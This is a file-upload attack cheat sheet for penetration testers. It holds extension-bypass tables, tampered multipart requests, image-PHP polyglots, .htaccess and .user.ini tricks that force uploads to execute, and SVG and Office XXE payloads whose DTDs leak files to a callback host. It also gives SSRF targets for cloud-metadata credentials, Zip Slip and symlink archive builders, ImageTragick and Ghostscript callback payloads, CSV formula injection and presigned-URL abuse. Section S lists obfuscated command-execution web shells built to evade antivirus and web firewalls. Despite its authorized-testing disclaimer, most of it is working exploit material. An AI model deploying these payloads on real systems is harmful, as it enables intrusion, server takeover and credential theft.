# File Upload Attack Arsenal — Bypass Tables, Polyglots & Payloads

> Companion to `FILE_UPLOAD_TESTING_GUIDE.md`. **Baseline first** (guide §4: where stored / what URL / which handler) — that decides which of these to use. Replace `YOUR.oast.fun` with your Collaborator/interactsh host. Authorized targets only; benign markers only; delete artifacts after (guide §26).

---

## A. Extension bypass cheat sheet (guide §7)

**PHP execution extensions (denylist leaks):**
```
.php .php2 .php3 .php4 .php5 .php7 .php8 .pht .phtml .phps .phar .pgif .inc .hphp .ctp .module
```
**ASP/ASPX:**
```
.asp .aspx .ascx .asmx .ashx .asa .cer .cdx .config(web.config) .cshtml .vbhtml .asax
```
**JSP / Java:**
```
.jsp .jspx .jspf .jsw .jsv .jhtml .action
```
**Other / handler-dependent:**
```
.pl .cgi .py .sh .rb .lua  ·  .htaccess (Apache)  ·  .svg .html .xhtml .xml (for XSS/XXE)
```

**Filter-evasion filename tricks:**
```
shell.php.jpg          double ext (Apache AddHandler runs it)
shell.jpg.php          last-ext executes
shell.pHp / shell.PHP  case
shell.php.              trailing dot
shell.php%00.jpg        null byte (legacy PHP < 5.3.4 / some langs)
shell.php%20            trailing space
shell.php/              trailing slash
shell.php;.jpg          semicolon (IIS legacy)
shell.asp;.jpg          IIS 6 semicolon
shell.aspx::$DATA       NTFS Alternate Data Stream (IIS)
shell.php#.jpg / shell.php?.jpg
....//shell.php          stripped-once traversal survives
shell.php\x00.jpg        raw null in Burp (hex 00)
"><svg onload=alert(1)>.png   filename → stored XSS (guide §9/§13)
```

---

## B. Multipart request tampering (Burp Repeater) (guide §5/§6)

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="file"; filename="shell.phtml"
Content-Type: image/png                         <-- lie about MIME (guide §6)

GIF89a;
<?php echo "RCE-POC-".md5("poc")."-".php_uname(); ?>
--X--
```
**Things to fuzz in the request:**
```
filename=  → all extension tricks (section A)
Content-Type per part → full MIME matrix + lie-pairs (section N)
structural / parser-confusion → missing/duplicate CT, multi-part, array[], CTE base64, RFC-2231 (section O)
the bytes → magic prefix + payload (section C) ; magic↔MIME cross-table (section N)
add a second file part / array param[]  → some validators check only the first
charset / boundary quirks
```

---

## C. Magic bytes & polyglots (guide §8)

**Magic byte prefixes (prepend before payload):**
```
GIF87a / GIF89a              GIF
\xFF\xD8\xFF\xE0             JPEG
\x89PNG\r\n\x1a\n            PNG
%PDF-1.4                     PDF
PK\x03\x04                   ZIP/DOCX/XLSX
\x42\x4D                     BMP
```
**Polyglot recipes:**
```bash
# GIF + PHP one-liner (marker):
printf 'GIF89a;\n<?php echo "RCE-POC-".md5("poc")."-".php_uname(); ?>\n' > shell.gif.php

# JPEG + PHP via EXIF comment (often survives re-encoding):
exiftool -Comment='<?php echo "RCE-POC-".md5("poc"); ?>' clean.jpg -o shell.jpg.php

# PNG with PHP appended (for non-re-encoding servers):
cp clean.png shell.php; printf '\n<?php echo "RCE-POC"; ?>\n' >> shell.php

# Valid image that also XSSes if sniffed as HTML (nosniff missing):
printf 'GIF89a/*<svg onload=alert(document.domain)>*/' > poly.gif
```

---

## D. RCE marker web shells (BENIGN — guide §12, §26)

> Prove execution with a marker, not a backdoor. Pick the language matching the server (httpx/Wappalyzer told you).

```php
<?php echo "RCE-POC-".md5("yourhandle-unique")."-".php_uname(); ?>
```
```jsp
<%= "RCE-POC-" + java.net.InetAddress.getLocalHost().getHostName() %>
```
```aspx
<%@ Page Language="C#" %><%= "RCE-POC-" + System.Environment.MachineName %>
```
> Requesting the stored file and seeing `RCE-POC-<hash>-<hostname>` = proven Critical RCE. **Do not** add `system($_GET[...])`. Files in `poc/`.

---

## E. `.htaccess` / `web.config` to force execution (guide §10)

```apache
# .htaccess — make image extensions run as PHP in this dir:
AddType application/x-httpd-php .jpg .png
# or force-handler:
AddHandler application/x-httpd-php .jpg
# or make everything here render as HTML (→ XSS):
# ForceType text/html
```
```xml
<!-- web.config (IIS) -->
<configuration><system.webServer><handlers>
  <add name="poc" path="*.jpg" verb="*" modules="ManagedPipelineHandler"
       scriptProcessor="..." resourceType="Unspecified"/>
</handlers></system.webServer></configuration>
```
```ini
; .user.ini  (PHP-FPM) — auto-include your shell into EVERY .php executed in this dir:
auto_prepend_file=shell.gif
; (shell.gif contains: <?php echo "RCE-POC-".php_uname(); ?>)
```
```
# nginx + PHP-FPM cgi.fix_pathinfo=1 path trick (no config-file upload needed):
GET /uploads/avatar.jpg/x.php        → executes avatar.jpg (a magic-byte+PHP polyglot, §C) AS PHP
GET /uploads/avatar.jpg%00.php       (legacy null-byte variant)
```
Then upload `shell.jpg` containing PHP/ASP → request it → executes. (Try `.htaccess`, `web.config`, **`.user.ini`**, and the FPM path trick — whichever the stack/denylist allows.)

---

## F. SVG payloads (XSS + XXE) (guide §13/§14)

**SVG stored XSS (served inline from app origin):**
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>alert(document.domain)</script>
</svg>
```
**SVG XXE — in-band file read:**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>
```
**SVG XXE — blind/OOB exfil (host the DTD on your server):**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY % p SYSTEM "http://YOUR.oast.fun/x.dtd"> %p;]>
<svg xmlns="http://www.w3.org/2000/svg"/>
```
```dtd
<!-- x.dtd hosted at YOUR.oast.fun -->
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR.oast.fun/leak?d=%f;'>">
%all;
```
**SVG SSRF:**
```xml
<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://169.254.169.254/latest/meta-data/"/></svg>
```

---

## G. Office (DOCX/XLSX) XXE (guide §14)

```
DOCX/XLSX = a ZIP of XML. Inject XXE into word/document.xml or [Content_Types].xml, re-zip:
  1) unzip clean.docx -d d
  2) edit d/word/document.xml — add the DOCTYPE + entity (OOB form, section F)
  3) (cd d && zip -r ../evil.docx .)
Upload evil.docx to a feature that parses/previews it.
```

---

## H. SSRF via "import from URL" (guide §15)

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/        AWS creds
http://metadata.google.internal/computeMetadata/v1/instance/             GCP (needs Metadata-Flavor)
http://169.254.169.254/metadata/instance?api-version=2021-02-01          Azure
http://127.0.0.1:6379/  http://localhost:8080/  http://internal-svc/     internal services
file:///etc/passwd                                                       LFI if file:// allowed
http://YOUR.oast.fun/ssrf                                                 confirm blind SSRF (OOB)
# filter bypass: http://127.0.0.1.nip.io  ·  http://2130706433  ·  http://[::1]  ·  attacker-redirect-to-internal
```

---

## I. Zip Slip & symlink archives (guide §17)

```python
# Zip Slip — make_zipslip.py (also in poc/): entry path traverses out on extraction
import zipfile
with zipfile.ZipFile("zipslip.zip","w") as z:
    z.writestr("../../../../var/www/html/poc.php", '<?php echo "RCE-POC-".php_uname(); ?>')
```
```bash
# Symlink archive — read/overwrite host files on extraction (tar preserves symlinks):
ln -s /etc/passwd link && tar -chf evil.tar link          # app serves "link" back → reads /etc/passwd
ln -s /var/www/html webroot && tar -chf evil.tar webroot  # then write THROUGH the link to drop/overwrite a served file
# targets: /etc/passwd · app config/.env · ~/.ssh/authorized_keys · a JS/HTML asset served to all users
```

---

## J. exiftool RCE (CVE-2021-22204) (guide §16)

```
If the server runs exiftool on uploads (common in image pipelines), a crafted DjVu metadata
file achieves RCE. Keep the embedded command BENIGN (an OOB ping), e.g.:
  (metadata) -> system command -> curl http://YOUR.oast.fun/exif-rce
Generators exist (search "CVE-2021-22204 PoC"); see poc/exif_rce_notes.md. Confirm via OOB callback only.
```

---

## K. DoS files (only where in scope — guide §19/§23)

```
Pixel flood: a tiny PNG/JPEG with enormous declared dimensions → memory blowup on decode.
Zip bomb: nested/repetitive zip with huge expansion ratio (demonstrate the RATIO, don't exhaust prod).
```

---

## L. CSV / formula injection (guide §20)

```
=HYPERLINK("//YOUR.oast.fun/?c="&A1,"click")
=cmd|'/c calc'!A1
@SUM(1+1)*cmd|'/c calc'!A1
+cmd|'/c calc'!A1
-2+3+cmd|'/c calc'!A1
```

---

## M. Automation (guide §28)

```bash
# Burp "Upload Scanner" BApp — best, fires the whole matrix + checks exec/XSS/XXE.
python3 fuxploider.py --url https://target/upload --true-regex "success"   # find bypassing ext/type
nuclei -u https://target -tags fileupload,imagemagick,exiftool,xxe
# After: reproduce by hand, confirm serving context (§4), prove with a benign marker (§26).
```

---

## N. Content-Type / MIME reference matrix (guide §6)

> Set the **per-part** `Content-Type` to a type the allowlist permits (not the request CT — that's `multipart/form-data`).
> First classify the validation model (guide §6.1); then pick from the right column. Sources: PortSwigger, PayloadsAllTheThings, HackTricks, IANA media-types.

**Types to try, by category:**
```
IMAGES        image/png  image/jpeg  image/jpg  image/gif  image/webp  image/bmp  image/x-ms-bmp
              image/svg+xml  image/tiff  image/x-icon  image/vnd.microsoft.icon  image/heic  image/heif  image/avif
DOCUMENTS     application/pdf  application/msword  application/rtf  text/rtf
              application/vnd.openxmlformats-officedocument.wordprocessingml.document        (.docx)
              application/vnd.openxmlformats-officedocument.spreadsheetml.sheet              (.xlsx)
              application/vnd.openxmlformats-officedocument.presentationml.presentation      (.pptx)
              application/vnd.ms-excel  application/vnd.ms-powerpoint
              application/vnd.oasis.opendocument.text  application/vnd.oasis.opendocument.spreadsheet
TEXT/MARKUP   text/plain  text/csv  text/html  text/xml  application/xml  application/json  text/markdown  text/calendar
ARCHIVES      application/zip  application/x-zip-compressed  application/gzip  application/x-gzip  application/x-tar
              application/x-7z-compressed  application/x-rar-compressed  application/java-archive
AUDIO/VIDEO   video/mp4  video/quicktime  video/x-msvideo  video/webm  audio/mpeg  audio/wav  audio/ogg  application/ogg
FONTS/MISC    font/woff  font/woff2  application/vnd.ms-fontobject  application/wasm
GENERIC/EDGE  application/octet-stream   (header omitted entirely)   ""(empty value)
              image/png; charset=utf-8   image/png;name=x   IMAGE/PNG  Image/Png  (case)   application/force-download
WHEN YOU WANT THE FILE INTERPRETED (RCE/XSS target — NOT to pass an allowlist):
              application/x-httpd-php  application/x-php  text/x-php  application/x-httpd-php-source
              text/html  application/xhtml+xml  image/svg+xml  text/xml  application/xml  application/javascript
```

**"Lie pairs" — payload bytes mapped to an allowed declared type (keep an executing extension, guide §7):**
```
PHP shell      + Content-Type: image/png   + filename shell.php / shell.phtml / shell.php.jpg
SVG XSS        + Content-Type: image/svg+xml (or image/png) + filename x.svg
HTML XSS       + Content-Type: text/html (or image/png if nosniff missing) + filename x.html
docx/xlsx XXE  + Content-Type: application/vnd.openxmlformats-...  + filename x.docx
JSP/ASPX shell + Content-Type: image/jpeg  + filename shell.jsp / shell.aspx
```

**Magic-byte ↔ MIME cross-table (prepend the signature so libmagic agrees, guide §8):**
```
MIME                         magic prefix (hex / ascii)
image/gif                    47 49 46 38 39 61            "GIF89a"  (or GIF87a)
image/jpeg                   FF D8 FF E0 / FF D8 FF E1     "JFIF"/"Exif" follows
image/png                    89 50 4E 47 0D 0A 1A 0A      ".PNG...."
image/bmp                    42 4D                         "BM"
image/tiff                   49 49 2A 00  /  4D 4D 00 2A   "II*." / "MM.*"
image/webp                   52 49 46 46 .. 57 45 42 50    "RIFF....WEBP"
image/x-icon                 00 00 01 00
application/pdf              25 50 44 46 2D                "%PDF-"
application/zip,docx,xlsx,jar 50 4B 03 04                  "PK.."
application/x-7z-compressed  37 7A BC AF 27 1C            "7z.."
application/gzip             1F 8B
application/x-rar-compressed 52 61 72 21 1A 07            "Rar!.."
video/mp4                    .. 66 74 79 70                "....ftyp" (at offset 4)
audio/mpeg (mp3)             49 44 33  /  FF FB            "ID3"
class file (java)            CA FE BA BE
```

---

## O. Multipart / parser-confusion structural tricks (guide §6.4)

> When a single CT swap fails, exploit a **disagreement** between the front-end validator and the back-end framework about how the multipart part is read. (PortSwigger / HackTricks / real bug-bounty Multer & WAF-bypass write-ups.)

```http
# 1) MISSING Content-Type (some validators default-allow)
--X
Content-Disposition: form-data; name="file"; filename="shell.phtml"

<?php echo "RCE-POC"; ?>
--X--

# 2) DUPLICATE Content-Type (validator reads one, server the other)
--X
Content-Disposition: form-data; name="file"; filename="shell.phtml"
Content-Type: image/png
Content-Type: application/x-php

<?php echo "RCE-POC"; ?>
--X--

# 3) MULTIPLE file parts, same name (validator checks #1 clean; server keeps #2)
--X
Content-Disposition: form-data; name="file"; filename="ok.png"
Content-Type: image/png

\x89PNG....(valid)
--X
Content-Disposition: form-data; name="file"; filename="shell.phtml"
Content-Type: image/png

<?php echo "RCE-POC"; ?>
--X--

# 4) ARRAY param (some validators inspect only file[0])
Content-Disposition: form-data; name="file[]"; filename="shell.phtml"

# 5) FILENAME injection in Content-Disposition (CRLF / ; / two filenames / RFC 2231)
Content-Disposition: form-data; name="file"; filename="shell.png";filename="shell.php"
Content-Disposition: form-data; name="file"; filename="shell.png%00.php"
Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
Content-Disposition: form-data; name="file"; filename="shell.php%0d%0a"

# 6) Content-Type param noise / case / whitespace
Content-Type: image/png; charset=utf-8
Content-Type:   image/png
content-type: image/png
Content-Type: image/png;;

# 7) Content-Transfer-Encoding (validator may not decode before checking)
Content-Disposition: form-data; name="file"; filename="shell.phtml"
Content-Type: image/png
Content-Transfer-Encoding: base64

PD9waHAgZWNobyAiUkNFLVBPQyI7ID8+        # base64(<?php echo "RCE-POC"; ?>)

# 8) Nested multipart/mixed (validator skips the sub-part the framework still processes)
Content-Disposition: form-data; name="file"
Content-Type: multipart/mixed; boundary=Y
--Y
Content-Disposition: file; filename="shell.phtml"
Content-Type: image/png

<?php echo "RCE-POC"; ?>
--Y--
```
> Send these one at a time; watch which is **accepted** *and* lands an executable/parseable file. The duplicate-CT, multi-part, and base64 CTE tricks are the ones that beat "properly combined" magic+MIME+extension checks.

---

## P. Real-world critical upload attacks & CVEs (guide §16) — High/Critical, benign-marker only

> These detonate inside the **processor** — a *valid file of an allowed type* is the payload, so they work even with allowlist + sandbox-CDN + re-encoding. Keep every command/target **benign** (OOB ping, /etc/hostname, your collaborator). Sources: ImageTragick, NVD, PortSwigger research, PayloadsAllTheThings, HackTricks.

**ImageMagick — ImageTragick RCE (CVE-2016-3714):** upload as `.png`/`.gif`/`.svg`/`.mvg`; triggers on resize/convert.
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|curl http://YOUR.oast.fun/imagetragick)'
pop graphic-context
```
**ImageMagick — arbitrary FILE READ (CVE-2022-44268):** a crafted PNG with a `tEXt`/profile chunk naming a server file; after `convert`, download the output PNG and extract the embedded bytes (use a benign target like `/etc/hostname`).

**Ghostscript RCE (CVE-2018-16509 / CVE-2023-36664 `%pipe%`):** upload a `.eps`/`.pdf`/`.ps` (often reached via ImageMagick's PDF delegate). Benign proof = a single OOB curl.
```
%!PS
( ) currentfile ... %pipe%curl http://YOUR.oast.fun/ghostscript ...   (use a published PoC matching the version)
```
**FFmpeg SSRF + local file read (HLS `.m3u8` / crafted AVI):** upload as a "video"; the transcoder reads the target into the output you can download.
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
file:///etc/hostname            # benign file-read proof; swap to http://169.254.169.254/... for SSRF→metadata
#EXT-X-ENDLIST
```
**PDF/HTML generator SSRF → cloud creds (wkhtmltopdf / headless Chrome / Prince):** get this into the uploaded/derived HTML or an "export to PDF" field — the secret renders INTO the PDF (cross-ref SSRF kit §11/§16).
```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<img src="file:///etc/passwd">
<iframe src="http://YOUR.oast.fun/pdf-ssrf"></iframe>     <!-- benign OOB confirm first -->
```
**exiftool RCE (CVE-2021-22204):** crafted DjVu metadata; runs when the server `exiftool`s the upload. Benign OOB only (see `poc/exif_rce_notes.md`).
**Office XXE (Apache POI / docx4j / python-docx):** docx/xlsx/pptx are zips of XML — inject XXE into `word/document.xml` or `[Content_Types].xml`, re-zip (arsenal §G), upload to a parse/preview feature → file read / SSRF.
**Vulnerable upload widgets:** jQuery-File-Upload (CVE-2018-9206), old Uploadify/Plupload/elFinder, CKEditor/TinyMCE file managers → direct RCE in the component (fingerprint the widget/version).

> **Method:** baseline says the file is *processed* (resize / thumbnail / "we generate a PDF" / "convert your video") → **fingerprint the processor + version** (errors, headers, timing), pick the matching CVE/SSRF above, and prove it with a **benign** OOB callback or a benign file target. Processing RCE / SSRF→metadata = **Critical**; processing file-read = **High** — and almost always un-duplicated.

---

## Q. Pre-signed URL / direct-to-cloud upload abuse (guide §18.1)
```bash
# 1) intercept the presign request/response, then craft the PUT yourself, altering key / Content-Type / ACL:
curl -X PUT "https://bucket.s3.amazonaws.com/<KEY>?<presigned-query>" \
     -H "Content-Type: text/html" \
     -H "x-amz-acl: public-read" \
     --data-binary @poc.html
# 2) abuse vectors:
#    KEY control:   key = ../../config/app.js  /  another user's userId/avatar  /  a served-asset path → overwrite → stored XSS / supply-chain
#    CT control:    Content-Type: text/html  or  image/svg+xml  → if served inline from an app origin → stored XSS
#    ACL control:   x-amz-acl: public-read    → make the object world-readable / upload web content
#    over-broad presign (whole bucket / long TTL / any key) → write beyond your folder
# 3) confirm by GETting the object back and reading its served Content-Type + origin.
```

## R. Race condition (TOCTOU) — beat the validate/scan/delete window (guide §12.3)
```bash
# upload the shell, then SIMULTANEOUSLY hammer GET to its URL during the save→validate→delete window:
# (Burp Turbo Intruder, or parallel curl)
URL=https://target/uploads/shell.php
for i in $(seq 1 400); do curl -s "$URL?c=echo RCE-POC-7f3a9" & done; wait
# success = a 200 with your RCE marker BEFORE the 404 (file deleted). Variants: quarantine/move window;
# LFI + phpinfo() temp-file race (leak /tmp/phpXXXXXX from phpinfo, then include it before PHP deletes it).
```

## S. AV / WAF web-shell evasion (guide §12 / §28) — keep it BENIGN-marker
```php
<?=`$_GET[c]`?>                                  // backticks = shell; tiny, low-signature
<?php $f="sys"."tem"; $f($_GET['c']); ?>          // string-split function name
<?php $f=$_GET['f']; $f($_GET['c']); ?>           // variable function (call system via ?f=system)
<?php eval(base64_decode($_GET['b64'])); ?>       // encoded payload (defeats signature match)
<?php assert($_GET['c']); ?>  /  preg_replace('/x/e','$_GET[c]','x')   // legacy eval-equiv (old PHP)
```
```
□ Confirm AV exists first with EICAR; note WHERE it triggers (on save? on scan? async?).
□ Prefer a minimal BENIGN proof shell (`<?=md5(31337);?>` → expect 4e8d...) — rarely matches AV signatures.
□ Multipart parser confusion (§O) + obfuscated shell often slips both WAF and AV.
□ Or win the RACE (§R) before the scan completes.
```

> Which payload to use is decided by **baseline** (guide §4) and the **decision tree** (guide Appendix B). A finding is only real when the server **executes/parses/serves** your file dangerously (guide §22/§23).
